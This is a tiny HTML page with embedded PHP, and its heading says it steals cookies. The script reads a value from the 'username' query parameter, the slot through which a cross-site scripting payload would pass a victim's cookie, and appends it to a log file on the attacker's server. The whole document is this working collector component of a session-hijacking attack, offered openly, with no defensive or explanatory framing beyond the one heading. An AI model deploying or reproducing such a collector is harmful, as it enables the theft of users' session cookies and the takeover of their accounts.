<html>
 
 <head>
  <h3>This page is a php script that steals a cookie</h3>
 </head>

 <body>

    <?php
      $f = fopen("log.txt","a");
      $cookie = "\n".$_GET['username']."\n";
      fwrite($f, $cookie);
      fclose($f);
    ?>

  

  </body>

</html>
